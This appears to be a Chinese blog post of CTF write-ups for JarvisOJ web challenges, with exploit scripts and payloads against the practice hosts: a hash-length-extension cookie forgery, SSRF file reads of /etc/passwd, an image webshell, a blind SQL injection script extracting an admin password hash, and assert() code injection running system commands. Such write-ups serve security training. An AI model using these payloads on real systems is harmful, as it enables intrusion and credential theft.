<p>mysql&gt; create function getflag returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;<br>Query OK, 0 rows affected (0.05 sec)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">得到flag：</span><br><span class="line"></span><br><span class="line">![](https:<span class="regexp">//</span>ws1.sinaimg.cn<span class="regexp">/large/</span><span class="number">005</span>RaR9Jgy1g1bybfs4qmj30iy05974b.jpg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag在管理员手里</span></span><br><span class="line"></span><br><span class="line">![](https:<span class="regexp">//</span>ws1.sinaimg.cn<span class="regexp">/large/</span><span class="number">005</span>RaR9Jgy1g1bye1p1t1j30jn04kq2v.jpg)</span><br><span class="line">在http头发现cookie头的hash 估计是哈希长度拓展攻击</span><br><span class="line">利用安装hash_extender 进行攻击</span><br><span class="line">在linux</span><br></pre></td></tr></table></figure></p>
<p>git clone <a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender</a><br>cd hash_extender<br>make<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在hash_extender目录下新建<span class="keyword">test</span>.py文件</span><br></pre></td></tr></table></figure></p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from urlparse import urlparse<br>from httplib import HTTPConnection<br>from urllib import urlencode<br>import json<br>import time<br>import os<br>import urllib<br>def gao(x, y):</p>
<pre><code>    #print x
    #print y
url = &quot;http://web.jarvisoj.com:32778/index.php&quot;
cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y
    #print cookie
build_header = {
        &apos;Cookie&apos;: cookie,
        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&apos;,
        &apos;Host&apos;: &apos;web.jarvisoj.com:32778&apos;,
        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
}
urlparts = urlparse(url)
conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)
conn.request(&quot;GET&quot;, urlparts.path, &apos;&apos;, build_header)
resp = conn.getresponse()
body = resp.read()
return body
</code></pre><p>for i in xrange(1000):<br>    print i</p>
<pre><code># secret len = ???
find_hash = &quot;./hash_extender -d &apos;;\&quot;tseug\&quot;:5:s&apos; -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a &apos;;\&quot;nimda\&quot;:5:s&apos; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot;
#print find_hash
calc_res = os.popen(find_hash).readlines()
hash_value = calc_res[0][:32]
attack_padding = calc_res[0][32:]
attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])
ret = gao(attack_padding, hash_value)
if &quot;Welcome&quot; in ret:
    print ret
    break
</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后在该目录输入 ```python test.py</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dqxtm02cj30mh0dmq3e.jpg" alt=""></p>
<h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c024jsz9j30ng0ef41b.jpg" alt=""><br>点击管理员登入<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c04tqt35j30db045a9z.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c09w1o4gj30mw07t3yz.jpg" alt=""><br>查看源码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c05ppk0jj30n208hgm8.jpg" alt=""><br>发现url参数可控<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1duusczvdj310y0c4myr.jpg" alt=""><br>所以我们可以基本判断，这里是存在SSRF的<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=file:/</span><span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv352reaj30ck0450sj.jpg" alt=""><br>发现被过滤了<br>进行大写转换<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv4d2g8sj311y07k404.jpg" alt=""><br>接下来进程站点目录挖掘<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv6esfunj30pj064t8z.jpg" alt=""><br>当不给url 参数值时 就会报错<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>opt<span class="regexp">/lampp/</span>htdocs<span class="regexp">/proxy.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv85qcmnj30vr0ip0ub.jpg" alt=""><br>接下来读取admin目录<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>opt<span class="regexp">/lampp/</span>htdocs<span class="regexp">/admin/i</span>ndex.html</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvbfqkbhj30pl08ot96.jpg" alt=""><br>对admin目录进行爆破<br>发现robots.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvd32k7hj30s305w3yv.jpg" alt=""><br>访问trojan.php,得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvg66cr2j310k074aat.jpg" alt=""></p>
<h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>打开是这么一个页面<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dta9cg6bj30yl0fygo1.jpg" alt=""></p>
<p>尝试先上传一个正常的jpg文件,然后在view中查看<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dthupb8tj30qz0i2dtc.jpg" alt=""></p>
<p>右击复制图片链接地址,得到图片地址<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/uploads/</span><span class="number">1553405018</span>.jpg</span><br></pre></td></tr></table></figure></p>
<p>上传木马图片,用菜刀连接,连接失败<br>观察这两个链接<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=submit</span><br><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=<span class="keyword">view</span></span><br></pre></td></tr></table></figure></p>
<p>加上单引号试试<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=<span class="keyword">view</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtraxii4j30rt0a33z1.jpg" alt=""><br>可能存在文件包含漏洞,试着包含刚刚的图片<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtsumgxlj30s108nmxo.jpg" alt=""><br>发现被加上了php后缀,尝试用%00 进行绕过<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dtvb9bnij30oy08zaaf.jpg" alt=""><br>尝试更换另一种script木马试试<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="undefined">phpinfo();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dup0qxpqj30nc078q3a.jpg" alt=""></p>
<h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g228rzyp3oj30jl08uaa6.jpg" alt=""><br>尝试使用username=admin&amp;password=123456，页面返回密码错误<br>尝试使用username=user&amp;password=123456，页面返回用户名错误<br>那么就说明验证方式是采用的用户名和密码分步验证的。</p>
<p>使用username=admin’#&amp;password=123456,页面返回密码错误，说明后台没有对#和’进行过滤。<br>使用username=admin’ or 1=1#&amp;password=123456，页面返回用户名错误，上面后台对admin’ or 1=1#中的部分内容进行了过滤。过滤的内容有可能是or也有可能是空格。<br>使用username=user’/<strong>/or/</strong>/1=1#&amp;password=123456，页面返回密码错误，说明输入的SQL语句能够被执行，这也表明后台仅仅是过滤了空格。<br>总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注了</p>
<p>查找表，<code>username=user&#39;/**/or/**/exists(select/**/*/**/from/**/ admin)#&amp;password=123456</code>,页面返回密码错误，那么就说明在数据库中存在admin表</p>
<p>查找字段<code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456</code>，页面返回密码错误，说明在admin表中存在username和password字段。</p>
<p>得到password长度，<code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>，通过二分试探法，最终发现password的字段长度是32位，说明可能采用的是md5的方式来进行加密的</p>
<p>在确定了password的长度之后，接下来就是利用Python来进行爆破了。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url = <span class="string">'http://web.jarvisoj.com:32787/login.php'</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">'xx'</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    username_template = <span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">    chars = <span class="string">'0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">char</span> <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(<span class="built_in">char</span>)</span><br><span class="line">            username = username_template.<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            payload[<span class="string">'username'</span>] = username</span><br><span class="line">            response = requests.post(url,data=payload)</span><br><span class="line">            length = <span class="built_in">len</span>(response.text)</span><br><span class="line">            # <span class="built_in">print</span>(length)</span><br><span class="line">            #返回的长度只有<span class="number">1191</span>和<span class="number">1192</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">char</span>)</span><br><span class="line">                result += <span class="built_in">char</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>
<p>得到密码的md5:334cfb59c9d74849801d5acdcfdaadc3<br>解md5后得:eTAloCrEP<br>登陆后得到flag:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2295ufy8jj30gd08daa6.jpg" alt=""></p>
<h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>XXE漏洞<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g229i9esgrj30sp0b6myc.jpg" alt=""></p>
<h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>发现robots.txt 访问 <code>http://web.jarvisoj.com:32792/admin_s3cr3t.php</code><br>修改cookie 再次访问得到flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvx44lgnj30qa07hwf6.jpg" alt=""></p>
<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>发现git文件泄漏，于是提取出来<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dw940lphj30ii05x3ys.jpg" alt=""><br>分析index. php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwds5jb4j30lr05lwet.jpg" alt=""><br>这里对page 进行了过滤<br>这里是assert()引起的代码注入<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwu891jaj30k90dvmy0.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dwvc0ez1j30o20exgox.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dx34uv4dj30yd0ie0ut.jpg" alt=""><br>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码<br>当page = flag’.system(“ls”).’<br>assert(“strpos(‘$file’, ‘..’) === false”)<br>拼接得到:assert(“strops(‘flag’.system(“ls”).’’,’..’) === false”)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dxi7c2x3j30qu07kmxh.jpg" alt=""><br>接下来构造<br>?page=’.system(‘cat templates/flag.php’).’<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dy8qcsjtj30vh08b0t9.jpg" alt=""><br>说明一下:assert与eval的区别<br>assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</p>
<h1 id="dctf-inject"><a href="#dctf-inject" class="headerlink" title="dctf]inject"></a>dctf]inject</h1><h1 id="dctf-register"><a href="#dctf-register" class="headerlink" title="dctf]register"></a>dctf]register</h1><h1 id="babyphp-1"><a href="#babyphp-1" class="headerlink" title="babyphp"></a>babyphp</h1><h1 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/24/JarvisOj-Writeup/" data-id="cjvrp4glb002g5gqr7njaela2" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日记/">日记</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSH/">SSH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日记/">日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/SSH/" style="font-size: 10px;">SSH</a> <a href="/tags/c/" style="font-size: 10px;">c++</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/代码审计/" style="font-size: 12.5px;">代码审计</a> <a href="/tags/开发/" style="font-size: 17.5px;">开发</a> <a href="/tags/日记/" style="font-size: 10px;">日记</a> <a href="/tags/汇编/" style="font-size: 10px;">汇编</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/05/17/网易云音乐免费下载/">网易云音乐免费下载</a>
          </li>
        
          <li>
            <a href="/2019/05/11/linux学习笔记/">linux学习笔记</a>
          </li>
        
          <li>
            <a href="/2019/05/11/docker学习/">docker学习</a>
          </li>
        
          <li>
            <a href="/2019/05/08/test/">test</a>
          </li>
        
          <li>
            <a href="/2019/04/19/PHP-sprintf格式化字符串漏洞/">PHP sprintf格式化字符串漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 筱阳<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>